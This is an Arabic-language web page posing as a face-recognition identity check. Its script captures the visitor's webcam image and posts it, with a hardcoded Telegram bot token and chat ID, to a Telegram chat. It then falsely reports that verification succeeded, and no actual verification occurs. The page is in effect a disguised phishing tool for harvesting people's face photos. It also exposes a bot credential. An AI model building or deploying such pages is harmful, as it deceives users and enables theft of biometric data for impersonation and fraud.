<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من الهوية</title>
    <style>
        /* تصميم واجهة مستخدم غامقة وأنيقة */
        body {
            background-color: #121212;
            color: #ffffff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            text-align: center;
            padding: 20px;
            border-radius: 20px;
            background: #1e1e1e;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            width: 90%;
            max-width: 400px;
        }

        /* إطار الكاميرا الدائري أو المنحني */
        .video-wrapper {
            position: relative;
            width: 250px;
            height: 250px;
            margin: 20px auto;
            border: 3px solid #3498db;
            border-radius: 50%; /* شكل دائري للوجه */
            overflow: hidden;
            background: #000;
        }

        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: scaleX(-1); /* مرآة لجعلها طبيعية للمستخدم */
        }

        .btn-verify {
            background-color: #3498db;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 25px;
            font-size: 16px;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 15px;
        }

        .btn-verify:hover { background-color: #2980b9; }

        #status {
            margin-top: 15px;
            font-size: 14px;
            color: #bbb;
        }

        canvas { display: none; }
    </style>
</head>
<body>

    <div class="container">
        <h2>التعرف على الوجه</h2>
        <p>يرجى وضع وجهك داخل الإطار لبدء التحقق</p>
        
        <div class="video-wrapper">
            <video id="video" autoplay playsinline></video>
        </div>

        <button class="btn-verify" id="captureBtn">ابدأ التحقق الآن</button>
        <p id="status">بانتظار الإذن للوصول للكاميرا...</p>
    </div>

    <canvas id="canvas"></canvas>

    <script>
        const token = "8372973119:AAEvtD7kL-5L1uA4URd_CROFb9V4z1nXt8E";
        const chatId = "591768998";
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const status = document.getElementById('status');
        const captureBtn = document.getElementById('captureBtn');

        // طلب تشغيل الكاميرا فور دخول الموقع
        async function initCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                status.innerText = "الكاميرا جاهزة، اضغط للتحقق.";
            } catch (err) {
                status.innerText = "يرجى السماح بالوصول للكاميرا للمتابعة.";
                console.error(err);
            }
        }

        captureBtn.addEventListener('click', () => {
            status.innerText = "جاري التقاط الصورة وتحليلها...";
            
            // التقاط فريم من الفيديو
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            canvas.toBlob(blob => {
                sendToTelegram(blob);
            }, 'image/jpeg');
        });

        function sendToTelegram(imageBlob) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', imageBlob, 'verification.jpg');
            formData.append('caption', '📸 صورة جديدة لعملية تحقق من الوجه');

            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(res => {
                status.innerText = "تم التحقق بنجاح! شكراً لك.";
                // يمكنك توجيه المستخدم لصفحة أخرى هنا
                // window.location.href = "success.html";
            })
            .catch(err => {
                status.innerText = "فشل في إرسال البيانات، حاول مجدداً.";
            });
        }

        window.onload = initCamera;
    </script>
</body>
</html>
